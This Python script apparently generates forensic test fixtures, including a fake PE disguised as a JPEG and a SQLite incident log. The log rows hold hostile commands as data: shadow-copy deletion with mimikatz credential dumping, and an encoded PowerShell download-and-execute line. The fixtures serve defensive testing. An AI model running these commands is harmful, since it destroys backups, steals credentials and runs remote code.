"""
generate_sample_data.py
=======================
Generates the 8-10 realistic forensic test fixtures in /sample_data as specified:
- 2 intact files (JPEG, PDF) -> INTEGRITY_VERIFIED
- 2 files with headers wiped but body intact -> PARTIALLY_RECOVERABLE
- 2 fragmented / out-of-order clusters -> reconstruct.py
- 1 zero-filled / near-empty file -> UNRECOVERABLE
- 1 disguised PE-in-.jpg file -> BLOCKED_SECURITY_RISK
- 1 SQLite DB with breach-window log entry -> tests NER/priority
"""

import io
import math
import os
import random
import sqlite3
import struct
import zlib
from pathlib import Path
from PIL import Image

SAMPLE_DIR = Path(__file__).resolve().parent / "sample_data"
SAMPLE_DIR.mkdir(parents=True, exist_ok=True)


def create_intact_jpeg(path: Path):
    """Creates a valid, compliant JPEG file."""
    img = Image.new("RGB", (128, 128), color=(20, 120, 220))
    # Draw some patterns to ensure varied Huffman tables and DCT coefficients
    for x in range(0, 128, 8):
        for y in range(0, 128, 8):
            if (x // 8 + y // 8) % 2 == 0:
                img.putpixel((x, y), (240, 240, 240))
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=85)
    data = buf.getvalue()
    path.write_bytes(data)
    return data


def create_intact_pdf(path: Path):
    """Creates a valid, complete PDF file with xref and trailer."""
    content = (
        b"%PDF-1.7\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n"
        b"4 0 obj\n<< /Length 55 >>\nstream\n"
        b"BT /F1 12 Tf 72 712 Td (FORENSIC REPORT: EVIDENCE INTACT) Tj ET\n"
        b"endstream\nendobj\n"
        b"xref\n0 5\n"
        b"0000000000 65535 f \n"
        b"0000000009 00000 n \n"
        b"0000000058 00000 n \n"
        b"0000000115 00000 n \n"
        b"0000000206 00000 n \n"
        b"trailer\n<< /Size 5 /Root 1 0 R >>\n"
        b"startxref\n312\n%%EOF\n"
    )
    path.write_bytes(content)
    return content


def create_wiped_header_jpeg(path: Path, intact_bytes: bytes):
    """Wipes the SOI + APP0 header (first 24 bytes zeroed), leaving body intact."""
    wiped = b"\x00" * 24 + intact_bytes[24:]
    path.write_bytes(wiped)


def create_wiped_header_pdf(path: Path, intact_bytes: bytes):
    """Wipes the %PDF header (first 16 bytes zeroed), leaving body & xref intact."""
    wiped = b"\x00" * 16 + intact_bytes[16:]
    path.write_bytes(wiped)


def create_fragmented_clusters(frag1_path: Path, frag2_path: Path):
    """
    Creates two clusters of a multi-fragment document with cross-cluster continuity.
    Frag-1 ends with an explicit pointer/text leading into Frag-2.
    """
    frag1 = (
        b"SAMDHAN_FRAG_HEADER_SEQ_001\n"
        b"INCIDENT_RECORD_CHUNK_ALPHA\n"
        b"Pointer: NEXT_SECTOR=0x00020000\n"
        b"Subject: Confidential Financial Exfiltration Log\n"
        b"Trailing text before cluster boundary: The suspect initiated the transfer at "
    )
    # Pad to 512 bytes (sector boundary)
    frag1 = frag1.ljust(512, b" ")

    frag2 = (
        b"14:22:05 UTC via encrypted channel.\n"
        b"Destination: 198.51.100.24:8443\n"
        b"Hash Confirmation: OK\n"
        b"SAMDHAN_FRAG_TRAILER_SEQ_002\n"
    )
    frag2 = frag2.ljust(512, b" ")

    frag1_path.write_bytes(frag1)
    frag2_path.write_bytes(frag2)


def create_zero_filled_wipe(path: Path):
    """Creates a 16 KB file filled completely with 0x00 (wiped unallocated sector)."""
    path.write_bytes(b"\x00" * 16384)


def create_disguised_pe_in_jpg(path: Path):
    """
    Creates a malicious file masquerading as .jpg but containing a valid MZ header
    and high-entropy pseudo-compressed/packed binary code (entropy > 7.7).
    """
    # MZ header (Windows PE magic: 4D 5A)
    dos_header = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00"
    dos_stub = (
        b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21"
        b"This program cannot be run in DOS mode.\r\r\n$" + (b"\x00" * 16)
    )
    # Generate high-entropy packed bytes
    random.seed(1337)
    high_entropy_payload = bytes(random.randint(0, 255) for _ in range(8192))
    
    malware_bytes = dos_header + dos_stub + high_entropy_payload
    path.write_bytes(malware_bytes)


def create_incident_sqlite_db(path: Path):
    """Creates a real SQLite DB with an active breach-window audit entry and forensic IOCs."""
    if path.exists():
        path.unlink()
    
    conn = sqlite3.connect(str(path))
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE forensic_audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            hostname TEXT,
            ip_address TEXT,
            ioc_domain TEXT,
            crypto_wallet TEXT,
            command_executed TEXT,
            severity TEXT
        );
    """)
    cur.execute("""
        INSERT INTO forensic_audit_logs 
        (timestamp, hostname, ip_address, ioc_domain, crypto_wallet, command_executed, severity)
        VALUES (
            '2026-09-24T18:42:10Z',
            'CORP-SRV-01',
            '198.51.100.24',
            'exfil.darkmesh.onion',
            'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
            'vssadmin delete shadows /all /quiet && mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
            'CRITICAL'
        );
    """)
    cur.execute("""
        INSERT INTO forensic_audit_logs 
        (timestamp, hostname, ip_address, ioc_domain, crypto_wallet, command_executed, severity)
        VALUES (
            '2026-09-24T19:15:33Z',
            'CORP-SRV-01',
            '203.0.113.88',
            'c2-drop.onion',
            'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq',
            'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIANAAvAHIAZQBjAG8AdgBlAHIAeQAuAHAAcwAxACcAKQA=',
            'CRITICAL'
        );
    """)
    conn.commit()
    conn.close()


def generate_all():
    print("[*] Generating /sample_data test fixtures...")
    jpg_bytes = create_intact_jpeg(SAMPLE_DIR / "intact_evidence.jpg")
    pdf_bytes = create_intact_pdf(SAMPLE_DIR / "intact_report.pdf")
    create_wiped_header_jpeg(SAMPLE_DIR / "wiped_header_photo.jpg", jpg_bytes)
    create_wiped_header_pdf(SAMPLE_DIR / "wiped_header_doc.pdf", pdf_bytes)
    create_fragmented_clusters(SAMPLE_DIR / "fragment_cluster_01.bin", SAMPLE_DIR / "fragment_cluster_02.bin")
    create_zero_filled_wipe(SAMPLE_DIR / "zero_filled_wipe.raw")
    create_disguised_pe_in_jpg(SAMPLE_DIR / "invoice.jpg")
    create_incident_sqlite_db(SAMPLE_DIR / "incident_audit.db")

    fixtures = list(SAMPLE_DIR.iterdir())
    print(f"[+] Successfully generated {len(fixtures)} realistic sample fixtures in {SAMPLE_DIR}:")
    for f in fixtures:
        print(f"    - {f.name} ({f.stat().st_size:,} bytes)")


if __name__ == "__main__":
    generate_all()
